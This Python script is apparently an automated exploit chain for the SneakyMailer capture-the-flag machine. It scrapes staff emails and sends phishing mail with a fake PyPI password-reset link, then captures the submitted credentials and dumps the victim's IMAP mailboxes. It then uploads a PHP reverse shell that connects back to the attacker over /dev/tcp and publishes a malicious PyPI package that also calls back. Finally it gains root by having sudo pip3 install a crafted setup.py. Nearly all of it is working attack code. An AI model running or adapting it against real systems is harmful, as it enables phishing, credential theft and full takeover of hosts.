#!/usr/bin/python3

from pwn import *
import smtplib
import random
import time
import argparse
import re
import urllib.parse
import coloredlogs
import colorama
import requests
from colorama import Fore
from imapclient import IMAPClient
import requests
from bs4 import BeautifulSoup
import email
import ssl
import ftplib
import io


_BOX_IP_ = '10.10.10.197'
_HOSTNAME_ = 'sneakycorp.htb'

logger = logging.getLogger(__name__)
coloredlogs.install(level='INFO', fmt='%(asctime)s-%(hostname)s-%(message)s', logger=logger)

def get_args():
	parser =argparse.ArgumentParser(description="Dumpster Autopwn for SneakyMailer", usage="python <script>.py -i <ip> -p <port> -t <user-part1|user-part2|root>", epilog="",   formatter_class=argparse.RawTextHelpFormatter)
	parser.add_argument('-i','--ip',type=str, help="Attacker IP", required=True)
	parser.add_argument('-p','--port',type=str, help="Attacker Port",required=True)
	parser.add_argument('-t','--target', type=str,choices=['user-part1','user-part2','user-part3', 'root'], required=True, help="user-part1: phishing, IMAP phase \r\nuser-part2: reverse-shell"   )

	args = parser.parse_args()
	attacker_ip = args.ip
	attacker_port = args.port
	target = args.target

	return attacker_ip,attacker_port,target

#Hits the main website and pulls down all emails
def gatherEmails(host):
	emailList  =  []
	url = "http://" +  host +  "/team.php" 
	logger.info("Making request to: [{0}] to gather email addresses".format(url))
	r  = requests.get(url)
	soup = BeautifulSoup(r.text, 'html.parser')	
	tds  =  soup.find_all('td')
	for i in tds:
		if "sneakymailer.htb" in i.contents[0]:
			emailList.append(i.contents[0])
	logger.info("We retrieved {0} email addreses, the email addreses are: {1}".format(len(emailList),emailList))
	return  emailList

#Sends emails to SMTP server to all the email addresses we discovered on the main site
def sendMail(ip,port,recipientList):

	sender = 'carastevens2322@sneakymailer.htb'
	#receivers = ["paulbyrd@sneakymailer.htb","tigernixon@sneakymailer.htb","garrettwinters@sneakymailer.htb","ashtoncox@sneakymailer.htb","cedrickelly@sneakymailer.htb","airisatou@sneakymailer.htb","briellewilliamson@sneakymailer.htb","herrodchandler@sneakymailer.htb","rhonadavidson@sneakymailer.htb","colleenhurst@sneakymailer.htb","sonyafrost@sneakymailer.htb","jenagaines@sneakymailer.htb","quinnflynn@sneakymailer.htb","chardemarshall@sneakymailer.htb","haleykennedy@sneakymailer.htb","tatyanafitzpatrick@sneakymailer.htb","michaelsilva@sneakymailer.htb","glorialittle@sneakymailer.htb","bradleygreer@sneakymailer.htb","dairios@sneakymailer.htb","jenettecaldwell@sneakymailer.htb","yuriberry@sneakymailer.htb","caesarvance@sneakymailer.htb","doriswilder@sneakymailer.htb","angelicaramos@sneakymailer.htb","gavinjoyce@sneakymailer.htb","jenniferchang@sneakymailer.htb","brendenwagner@sneakymailer.htb","fionagreen@sneakymailer.htb","shouitou@sneakymailer.htb","michellehouse@sneakymailer.htb","sukiburks@sneakymailer.htb","prescottbartlett@sneakymailer.htb","gavincortez@sneakymailer.htb","martenamccray@sneakymailer.htb","unitybutler@sneakymailer.htb","howardhatfield@sneakymailer.htb","hopefuentes@sneakymailer.htb","vivianharrell@sneakymailer.htb","timothymooney@sneakymailer.htb","jacksonbradshaw@sneakymailer.htb","olivialiang@sneakymailer.htb","brunonash@sneakymailer.htb","sakurayamamoto@sneakymailer.htb","thorwalton@sneakymailer.htb","finncamacho@sneakymailer.htb","sergebaldwin@sneakymailer.htb","zenaidafrank@sneakymailer.htb","zoritaserrano@sneakymailer.htb","jenniferacosta@sneakymailer.htb","carastevens@sneakymailer.htb","hermionebutler@sneakymailer.htb","laelgreer@sneakymailer.htb","jonasalexander@sneakymailer.htb","shaddecker@sneakymailer.htb","sulcud@sneakymailer.htb","donnasnider@sneakymailer.htb"]

	message = """From: From Cara Stevens <carastevens2322@sneakymailer.htb>
To: sulcud <sulcud@sneakymailer.htb>
Subject: SMTP e-mail test
This is a test e-mail message. <a href="http://{0}:{1}/pypi/"> Reset your pypi password!</a>
""".format(ip,port) 

	try:
	   smtpObj = smtplib.SMTP(_BOX_IP_,25)
	   smtpObj.sendmail(sender, recipientList, message)         
	   logger.info(Fore.GREEN+ "Successfully sent emails to all recipients")
	except SMTPException:
	   logger.error("Error: unable to send emails")

#Phishing Receiver to receive the click from recipients
#Returns the contents of the phish
def phishReceiver(attacker_ip, attacker_port,recipientList):
	l1 = listen(attacker_port)
	logger.info("Sending Emails to SMTP server on port 25")
	sendMail(attacker_ip, attacker_port,recipientList)
	svr = l1.wait_for_connection()
	contents = svr.recv()
	result  = re.search('password=(.*)&rpassword',str(contents))
	logger.info("Someone replied to our phishing email with contents: {0}".format(str(contents)))
	paulsPassword = urllib.parse.unquote(result.group(1))
	logger.info(Fore.GREEN+  "We received Paul Byrds password from our phishing. The password is: {0}".format(paulsPassword))

	result =  re.search('&email=(.*)&password',str(contents))
	username  = urllib.parse.unquote(result.group(1))
	return paulsPassword, username

#Connects to IMAP and pulls down all emails
def imapStep(imap_user, imap_pass):
	contents = []
	ssl_context = ssl.create_default_context()
	ssl_context.check_hostname = False
	ssl_context.verify_mode = ssl.CERT_NONE
	server = IMAPClient(_BOX_IP_, ssl_context=ssl_context)
	logger.info("Logging into IMAP service using {0}'s credentials with password: {1}".format(imap_user,imap_pass))
	loginResp  = server.login(imap_user, imap_pass)
	if 'Ok.' in str(loginResp):
		listResp = server.list_folders()
		for item in listResp:
			flags,delimiter,folderName = item

			logger.info("Searching mailbox: {0}".format(folderName))
			folderResp = server.select_folder(folderName)
			existCount = folderResp[b'EXISTS']
			if existCount > 0:
				logger.info(Fore.CYAN+  "!!!! Mail found in folder: {0}".format(folderName))
				messages = server.search()
				response = server.fetch(messages,['RFC822'])
				for msgid, data in response.items():
					logger.info ("Retrieving contents of message id: {0}".format(msgid))
					parsedEmail = email.message_from_bytes(data[b'RFC822'])
					contents.append(parsedEmail)
			else:
				logger.info(Fore.YELLOW+ "No mail found in folder: {0}".format(folderName))
	logger.info(Fore.GREEN + "Done retrieving all emails for {0}'s inboxes".format(imap_user))
	return contents

#Writes email contents to file
def writeEmailsToFile(contents,filename):
	with open(filename,"w") as f:
		for i in contents:
			f.write(str(i))
		f.close()

#Connects to FTP and uploads our reverse shell payload
def uploadFileToFTP(username,password,directory,filename):
	#ftp reverse shell
	logger.info("Connecting to FTP Service @: {0} with username: {1} and password: {2}".format(_BOX_IP_,username,password))
	session = ftplib.FTP(_BOX_IP_, username, password)
	session.cwd("dev")
	payload  = """<?php exec("/bin/bash -c 'bash -i > /dev/tcp/{0}/{1} 0>&1'"); ?>""".format(attacker_ip,attacker_port) 
	f  = io.BytesIO(payload.encode())
	logger.info("Uploading file: {0}".format(filename))
	session.storbinary('STOR '+filename, f)
	logger.info("Uploaded file! Time for reverse shell")
	session.close()

#Uploads our malicious  pypi package
def uploadPypiPackage(attacker_ip,attacker_port):

	with open ("mypackage/setup-source","r") as f:
		text=f.read()
		f.close
	#replace with attacker ip/port
	text = text.replace("<IP_HERE>",attacker_ip)
	text = text.replace("<PORT_HERE>",attacker_port)
	with open("mypackage/setup.py","w") as f:
		f.write(text)
		f.close()
	logger.info("Uploading malicious pypi package to server")
	subprocess.Popen(['python3', 'setup.py', 'sdist', 'upload','-r','sneakycorp'] , cwd="mypackage")

if __name__ == "__main__":

	attacker_ip, attacker_port, target = get_args()
	if target  == "user-part1":

		recipientList = gatherEmails(_HOSTNAME_)
		paulsPassword,emailAddress = phishReceiver(attacker_ip, attacker_port,recipientList)
		#paulsPassword=  "^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht"
		#emailAddress = 'paulbyrd@sneakymailer.htb'
		emailAddress = emailAddress.split('@')[0]
		
		contents = imapStep(emailAddress,paulsPassword)

		filename= "john-sneaky-emails.txt"
		logger.info("Writing email contents to file {0} -- Go Read them!".format(filename))
		writeEmailsToFile(contents, filename)
	
	elif target  ==  "user-part2":

		##  We retrieved the credentials in the previous step.. look at da emails
		username = "developer"
		password = "m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C"
		filename  =  "ganapati.php"
		
		uploadFileToFTP(username,password,"dev",filename)
		l1 = listen(attacker_port)
		url  = "http://dev." + _HOSTNAME_ +"/"+filename
		logger.info("Waiting for interactive shell... give it a few (30 seconds)")
		requests.get(url)
		svr  =  l1.wait_for_connection()
		
		svr.sendline("""python -c "import pty;pty.spawn('/bin/bash')" """)
		svr.sendline("""whoami""")
		svr.interactive()

	elif target == "user-part3":

		l1 = listen(attacker_port)
		#read original setup source file
		uploadPypiPackage(attacker_ip,attacker_port)

		svr = l1.wait_for_connection()
		svr.sendline("""python -c "import pty;pty.spawn('/bin/bash')" """)
		svr.sendline("""whoami""")
		svr.sendline("""ls -l /home/low""")
		svr.interactive()
		

	elif target == "root":
		l1 = listen(attacker_port)
		
		#read  original setup source file
		uploadPypiPackage(attacker_ip,attacker_port)

		svr = l1.wait_for_connection()
		svr.sendline("""python -c "import pty;pty.spawn('/bin/bash')" """)
		svr.sendline("""whoami""")
		svr.sendline("""TF=$(mktemp -d)""")
		svr.sendline("""echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py  """)
		svr.sendline("""sudo pip3 install $TF""")
		time.sleep(10)
		logger.info("Wait a bit - should be root soon")
		svr.sendline("""whoami""")
		svr.sendline("""ls -l /root""")
		logger.info(Fore.GREEN + "Enjoy!")
		svr.interactive()


		
